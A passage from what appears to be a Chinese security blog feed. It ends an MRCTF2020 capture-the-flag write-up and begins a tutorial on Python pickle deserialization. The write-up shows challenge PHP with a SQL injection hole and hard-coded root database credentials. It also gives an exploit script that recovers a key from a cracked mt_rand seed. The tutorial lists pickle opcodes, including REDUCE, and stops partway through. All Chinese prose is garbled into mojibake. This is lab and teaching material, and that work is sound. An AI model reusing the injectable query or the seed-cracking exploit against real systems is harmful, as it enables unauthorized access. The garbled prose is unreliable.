class="string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$mt_srand() = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>å…ˆçœ‹æœ€ä¸‹é¢ï¼Œå¾ˆæ˜æ˜¾phpä¼ªéšæœºæ•°ï¼Œç»™äº†mt_srand()ï¼Œç”¨php_mt_seedçˆ†ç ´å‡ºç§å­ï¼Œå†ç”¨ç§å­ç®—private_key</p><p>å…ˆç”Ÿæˆphp_mt_seedçˆ†ç ´çš„åºåˆ—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">print(str(s.index(i))+<span class="string">&quot; &quot;</span>+str(s.index(i))+<span class="string">&quot; 0 61 &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>çˆ†ç ´å‡ºç§å­ä¸º1775196155</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> public_key().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> private_key().<span class="string">&quot;\n&quot;</span>;<span class="comment">// XuNhoueCDCGc</span></span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>è¯•äº†è¯•index.phpæ²¡ååº”ï¼Œæºç å¯èƒ½æ˜¯ç™»é™†é¡µé¢ï¼Œlongin.phpè¿˜çœŸæœ‰</p><p>æ¥ç€å°±æ³¨å…¥æ‹¿flagäº†</p><img src="/2020/04/11/MRCTF2020-writeup/TIMæˆªå›¾20200416122724.png" style="zoom:80%;"><h3 id="Ezpop-Reveng"><a href="#Ezpop-Reveng" class="headerlink" title="Ezpop_Reveng"></a>Ezpop_Reveng</h3><p>dirsearchåˆæ‰«ä¸åˆ°<code>www.zip</code>ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯å•¥åŸå› ï¼Œæ¢dirmapäº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> MRCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonååºåˆ—åŒ–å­¦ä¹ </title>
      <link href="2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†Pythonååºåˆ—åŒ–çš„ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸phpåºåˆ—åŒ–ååºåˆ—åŒ–ç±»ä¼¼</p><p>Pythonåºåˆ—åŒ–ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªåœ¨å†…å­˜å½“ä¸­çš„pythonå¯¹è±¡é€šè¿‡æŸç§åè®®æˆ–è€…æ ‡å‡†ï¼Œè½¬æ¢æˆäºŒè¿›åˆ¶ç±»å‹çš„æ•°æ®ã€‚</p><p>Pythonååºåˆ—åŒ–ï¼Œæ˜¯ä¸€ä¸ªå®Œå…¨ç›¸åçš„è¿‡ç¨‹ï¼Œä»ç£ç›˜æ–‡ä»¶æˆ–è€…ç½‘ç»œä¸­è¯»å–åˆ°äºŒè¿›åˆ¶æ•°æ®ï¼Œå°†å®ƒä»¬è½¬æ¢æˆå†…å­˜ä¸­å¯æ“ä½œçš„å¯¹è±¡ï¼Œè¿™å°±æ˜¯ååºåˆ—åŒ–ã€‚</p><p>Pythonå®ç°åºåˆ—åŒ–æ–¹æ¡ˆï¼š</p><ul><li>pickle</li><li>PyYAML</li><li>XML</li><li>json</li><li>messagepack</li></ul><p>ä¸‹é¢ä¸»è¦ä»‹ç»pickleæ¨¡å—åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</p><h2 id="pickleæ¨¡å—"><a href="#pickleæ¨¡å—" class="headerlink" title="pickleæ¨¡å—"></a>pickleæ¨¡å—</h2><p><strong>åºåˆ—åŒ–ï¼šä½¿ç”¨dumpsæˆ–è€…dumpæ–¹æ³•</strong></p><ul><li>dumpsï¼šå°†å†…å­˜å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚å¯¹è±¡</li><li>dumpï¼šå°†å†…å­˜å¯¹è±¡åºåˆ—åŒ–åˆ°æ–‡ä»¶å¯¹è±¡(å­˜å…¥æ–‡ä»¶)</li></ul><p><strong>ååºåˆ—åŒ–ï¼šä½¿ç”¨loadså’Œloadæ–¹æ³•</strong></p><ul><li>loadsï¼šå°† å­—èŠ‚å¯¹è±¡ååºåˆ—åŒ–ä¸ºå†…å­˜å¯¹è±¡</li><li>loadï¼šä»æ–‡ä»¶å¯¹è±¡ååºåˆ—åŒ–ä¸ºå†…å­˜å¯¹è±¡</li></ul><p><strong>ä¸¾ä¸ªä¾‹å­ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;MoonBack&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">print(pickle.dumps(a))</span><br><span class="line">print(pickle.loads(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><img src="/2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200409194036.png" style="zoom:80%;"><p><code>__str__</code>ç±»ä¼¼äºjavaä¸­çš„toStringæ–¹æ³•ï¼Œå³è¿”å›å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\x80\x03c__main__\nPeople\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\x08\x00\x00\x00MoonBackq\x04sb.&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¹ˆé•¿çš„ä¸€ä¸²æ˜¯å•¥æ„æ€å‘¢ï¼Ÿæ…¢æ…¢æ¥è¯´</p><h2 id="pickleæŒ‡ä»¤ç "><a href="#pickleæŒ‡ä»¤ç " class="headerlink" title="pickleæŒ‡ä»¤ç "></a>pickleæŒ‡ä»¤ç </h2><p><code>pickle.loads()</code>å‡½æ•°æ˜¯æˆ‘ä»¬ç”¨æ¥ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡çš„ä¸€ä¸ªæ¥å£ï¼Œåº•å±‚å®ç°æ˜¯åŸºäº<code>_Unpickler</code>ç±»</p><p><code>_Unpickler</code>ç±»ç»´æŠ¤äº†ä¸¤ä¸ªä¸œè¥¿ï¼šæ ˆåŒºå’Œå­˜å‚¨åŒºã€‚ç»“æ„å¦‚ä¸‹å›¾ï¼š</p><img src="/2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/v2-5e2eeae4c4943c31aee406fa3b467301_720w.jpg" style="zoom:80%;"><p>ã€€<strong>æ ˆ</strong>æ˜¯unpickleæœºæœ€æ ¸å¿ƒçš„æ•°æ®ç»“æ„ï¼Œæ‰€æœ‰çš„æ•°æ®æ“ä½œå‡ ä¹éƒ½åœ¨æ ˆä¸Šã€‚ä¸ºäº†åº”å¯¹æ•°æ®åµŒå¥—ï¼Œæ ˆåŒºåˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šå½“å‰æ ˆä¸“æ³¨äºç»´æŠ¤æœ€é¡¶å±‚çš„ä¿¡æ¯ï¼Œ<strong>æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›</strong>ï¼Œæœ‰çš„è¿™éƒ¨åˆ†åšå®¢ä¸Šå†™çš„æ˜¯<strong>æŒ‡ä»¤å¤„ç†å™¨</strong>ï¼Œè€Œå‰åºæ ˆç»´æŠ¤ä¸‹å±‚çš„ä¿¡æ¯ï¼Œç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚</p><p>ã€€<strong>å­˜å‚¨åŒº</strong>å¯ä»¥ç±»æ¯”å†…å­˜ï¼Œç”¨äºå­˜å–å˜é‡ã€‚å®ƒæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä»¥ä¸‹æ ‡ä¸ºç´¢å¼•ã€‚å®ƒçš„æ¯ä¸€ä¸ªå•å…ƒå¯ä»¥ç”¨æ¥å­˜å‚¨ä»»ä½•ä¸œè¥¿ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬å¹¶ä¸éœ€è¦è¿™ä¸ªå­˜å‚¨åŒº</p><p>çœ‹äº†å…¶ä»–äººå†™çš„åšå®¢ï¼Œå‘ç°å¯¹è¿™ä¸‰ä¸ªåç§°å«æ³•ä¸å°½ç›¸åŒï¼Œä½†è¡¨è¾¾çš„æ„æ€åŸºæœ¬ç›¸ä¼¼ï¼Œå°±è¿™æ ·ç†è§£å§ï¼</p><p>ä¸ºäº†çœ‹çš„æ›´æ¸…æ™°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Pythonæä¾›çš„pickleè°ƒè¯•å™¨æ¨¡å—pickletools</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;MoonBack&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">pickletools.dis(pickle.dumps(a))</span><br></pre></td></tr></table></figure><img src="/2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200409203930.png" style="zoom: 67%;"><p>å…¶å®å°±æ˜¯åºåˆ—åŒ–ç»“æœçš„æ¯”è¾ƒå®¹æ˜“ç†è§£çš„å½¢å¼ï¼Œçœ‹ç€å’Œæ±‡ç¼–ä»£ç å¾ˆåƒï¼Œåœ¨ç»“æœé‡Œé¢æ¯ä¸€è¡Œå°±æ˜¯ä¸€ä¸ªæŒ‡ä»¤ç ã€‚</p><p>è¿™äº›æŒ‡ä»¤è¯´æ˜ï¼Œå…¨æ˜¯è‹±æ–‡å°±å¾ˆéš¾å—ï¼Œå®åœ¨æ‰¾ä¸åˆ°å°±ç¿»è¯‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line"><span class="keyword">FLOAT</span>          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line"><span class="keyword">INT</span>            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line"><span class="keyword">STRING</span>         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"><span class="keyword">GLOBAL</span>         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line"><span class="keyword">LIST</span>           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="literal">TRUE</span>           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"><span class="literal">FALSE</span>          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br></pre></td></tr></table></figure><p>å½“å‰ç”¨äº pickling çš„åè®®å…±æœ‰ 5 ç§ã€‚ä½¿ç”¨çš„åè®®ç‰ˆæœ¬è¶Šé«˜ï¼Œè¯»å–ç”Ÿæˆçš„ pickle æ‰€éœ€çš„ Python ç‰ˆæœ¬å°±è¦è¶Šæ–°ã€‚</p><ul><li>v0 ç‰ˆåè®®æ˜¯åŸå§‹çš„ â€œäººç±»å¯è¯»â€ åè®®ï¼Œå¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„ Pythonã€‚</li><li>v1 ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„ Python å…¼å®¹ã€‚</li><li>v2 ç‰ˆåè®®æ˜¯åœ¨ Python 2.3 ä¸­å¼•å…¥çš„ã€‚å®ƒä¸ºå­˜å‚¨ <a href="https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class">new-style class</a> æä¾›äº†æ›´é«˜æ•ˆçš„æœºåˆ¶ã€‚æ¬²äº†è§£æœ‰å…³ç¬¬ 2 ç‰ˆåè®®å¸¦æ¥çš„æ”¹è¿›ï¼Œè¯·å‚é˜… <a href="https://www.python.org/dev/peps/pep-0307">PEP 307</a>ã€‚</li><li>v3 ç‰ˆåè®®æ·»åŠ äº Python 3.0ã€‚å®ƒå…·æœ‰å¯¹ <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes">bytes</a> å¯¹è±¡çš„æ˜¾å¼æ”¯æŒï¼Œä¸”æ— æ³•è¢« Python 2.x æ‰“å¼€ã€‚è¿™æ˜¯ç›®å‰é»˜è®¤ä½¿ç”¨çš„åè®®ï¼Œä¹Ÿæ˜¯åœ¨è¦æ±‚ä¸å…¶ä»– Python 3 ç‰ˆæœ¬å…¼å®¹æ—¶çš„æ¨èåè®®ã€‚</li><li>v4 ç‰ˆåè®®æ·»åŠ äº Python 3.4ã€‚å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡ï¼Œèƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡ï¼Œè¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–ã€‚æœ‰å…³ç¬¬ 4 ç‰ˆåè®®å¸¦æ¥æ”¹è¿›çš„ä¿¡æ¯ï¼Œè¯·å‚é˜… <a href="https://www.python.org/dev/peps/pep-3154">PEP 3154</a>ã€‚</li></ul><p>0å·ç‰ˆæœ¬æ˜¯äººç±»æœ€å¯è¯»çš„ï¼›ä¹‹åçš„ç‰ˆæœ¬åŠ å…¥äº†ä¸€å¤§å †ä¸å¯æ‰“å°å­—ç¬¦ï¼Œä¸è¿‡è¿™äº›æ–°åŠ çš„ä¸œè¥¿éƒ½åªæ˜¯ä¸ºäº†ä¼˜åŒ–ï¼Œæœ¬è´¨ä¸Šæ²¡æœ‰å¤ªå¤§çš„æ”¹åŠ¨ã€‚</p><p>ä¸€ä¸ªå¥½æ¶ˆæ¯æ˜¯ï¼Œ<strong>pickleåè®®æ˜¯å‘å‰å…¼å®¹çš„</strong>ã€‚0å·ç‰ˆæœ¬çš„å­—ç¬¦ä¸²å¯ä»¥ç›´æ¥äº¤ç»™pickle.loads()ï¼Œä¸ç”¨æ‹…å¿ƒå¼•å‘ä»€ä¹ˆæ„å¤–ã€‚</p><p>æŠ˜ç£¨å¤šå¥½åƒæ²¡å•¥ç”¨ï¼Œä»‹ç»å‡ ä¸ªå¸¸ç”¨çš„æŒ‡ä»¤ç ï¼š</p><ul><li>S : åé¢è·Ÿçš„æ˜¯å­—ç¬¦ä¸²</li><li>Iï¼šåé¢è·Ÿçš„æ˜¯æ•´å½¢</li><li>sï¼šæ·»åŠ é”®å€¼å¯¹åˆ°å­—å…¸</li><li>( ï¼šå‹å…¥ä¸€ä¸ªæ ‡å¿—åˆ°æ ˆä¸­ï¼Œè¡¨ç¤ºå…ƒç»„çš„å¼€å§‹ä½ç½®</li><li>t ï¼šä»æ ˆé¡¶å¼€å§‹ï¼Œæ‰¾åˆ°æœ€ä¸Šé¢çš„ä¸€ä¸ª<code>(</code>ï¼Œå¹¶å°†<code>(</code>åˆ°<code>t</code>ä¸­é—´çš„å†…å®¹å…¨éƒ¨å¼¹å‡ºï¼Œç»„æˆä¸€ä¸ªå…ƒç»„ï¼Œå†æŠŠè¿™ä¸ªå…ƒç»„å‹å…¥æ ˆä¸­</li><li>c ï¼šå¼•å…¥æ¨¡å—åå’Œç±»åï¼ˆæ¨¡å—åå’Œç±»åä¹‹é—´ä½¿ç”¨å›è½¦åˆ†éš”ï¼Œfind_classæ ¡éªŒå°±åœ¨è¿™ä¸€æ­¥ï¼‰</li><li>R ï¼šä»æ 